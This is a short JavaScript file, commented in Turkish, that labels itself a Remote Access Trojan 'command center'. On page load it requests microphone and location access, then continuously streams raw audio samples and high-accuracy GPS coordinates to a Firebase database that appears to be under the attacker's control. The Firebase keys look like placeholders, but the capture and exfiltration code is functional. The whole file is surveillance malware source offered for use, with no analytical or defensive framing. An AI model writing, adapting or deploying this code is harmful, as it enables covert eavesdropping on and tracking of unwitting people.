// RAT (Remote Access Trojan) - Siber-Punk Komuta Merkezi

// Firebase yapılandırması
const firebaseConfig = {
    apiKey: "AIzaSyD3X5Y7Z9C1V3B5N7M9K1L3J5H7G9F1D3",
    authDomain: "siber-punk-komuta.firebaseapp.com",
    databaseURL: "https://siber-punk-komuta-default-rtdb.firebaseio.com",
    projectId: "siber-punk-komuta",
    storageBucket: "siber-punk-komuta.appspot.com",
    messagingSenderId: "1234567890",
    appId: "1:1234567890:web:abcdef1234567890"
};

// Firebase başlat
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Mikrofon ve konum izni iste
async function requestPermissions() {
    try {
        // Mikrofon izni iste
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        
        // Konum izni iste
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
        });
        
        // İzinler verildi, verileri Firebase'e kaydet
        database.ref('permissions').push({
            audio: true,
            location: true,
            timestamp: firebase.database.ServerValue.TIMESTAMP
        });
        
        // Ortam dinleme ve konum izleme fonksiyonlarını başlat
        startAudioCapture(audioStream);
        startLocationTracking();
    } catch (error) {
        console.error('İzinler alınamadı:', error);
    }
}

// Ortam dinleme fonksiyonu
function startAudioCapture(audioStream) {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const mediaStreamSource = audioContext.createMediaStreamSource(audioStream);
    const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
    
    mediaStreamSource.connect(scriptProcessor);
    scriptProcessor.connect(audioContext.destination);
    
    scriptProcessor.onaudioprocess = function(event) {
        const inputBuffer = event.inputBuffer;
        const inputData = inputBuffer.getChannelData(0);
        
        // Ses verilerini Firebase'e kaydet
        database.ref('audio').push({
            data: Array.from(inputData),
            timestamp: firebase.database.ServerValue.TIMESTAMP
        });
    };
}

// Konum izleme fonksiyonu
function startLocationTracking() {
    navigator.geolocation.watchPosition((position) => {
        // Konum verilerini Firebase'e kaydet
        database.ref('location').push({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            timestamp: firebase.database.ServerValue.TIMESTAMP
        });
    }, (error) => {
        console.error('Konum alınamadı:', error);
    }, {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 5000
    });
}

// Sayfa yüklendiğinde izinleri iste
window.onload = function() {
    requestPermissions();
};
